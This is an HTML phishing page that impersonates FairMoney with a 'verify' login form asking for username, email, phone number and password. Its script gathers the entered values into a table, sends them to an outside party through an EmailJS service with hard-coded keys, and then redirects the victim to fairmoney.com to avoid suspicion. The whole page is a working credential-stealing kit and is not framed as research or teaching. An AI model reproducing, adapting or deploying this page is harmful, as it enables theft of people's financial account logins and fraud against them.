<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>verify</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("QqgIRxc-3FYuxfpi7"); // Replace with your EmailJS public key
    })();
  </script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f6fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 250px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 120px;
    }

    h2 {
      text-align: center;
      color: #1a1a1a;
      margin-bottom: 30px;
    }

    input[type="text"],
    input[type="email"],
    input[type="password"],
    input[type="tel"] {
      width: 80%;
      padding: 12px 15px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #00aa5b;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background-color: #008a49;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="download.jpeg" alt="FairMoney Logo" />
    </div>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required />
      <input type="email" id="email" placeholder="Email" required />
      <input type="tel" id="phone" placeholder="Phone Number" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Verify</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e){
      e.preventDefault();

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const phone = document.getElementById("phone").value;
      const password = document.getElementById("password").value;

      if (!username || !email || !phone || !password) {
        alert("Please fill all fields!");
        return;
      }

      const table = `
        <table border="1" cellpadding="10" cellspacing="0">
          <tr><th>Field</th><th>Value</th></tr>
          <tr><td>Username</td><td>${username}</td></tr>
          <tr><td>Email</td><td>${email}</td></tr>
          <tr><td>Phone</td><td>${phone}</td></tr>
          <tr><td>Password</td><td>${password}</td></tr>
        </table>
      `;

      emailjs.send("service_pyqlmn8", "template_21rwskh", {
        message: table
      })
      .then(() => {
        console.log("Email sent successfully!");
        window.location.href = "fairmoney.com";
      }, (error) => {
        alert("Failed to verify.\n" + JSON.stringify(error));
      });
    });
  </script>
</body>
</html>
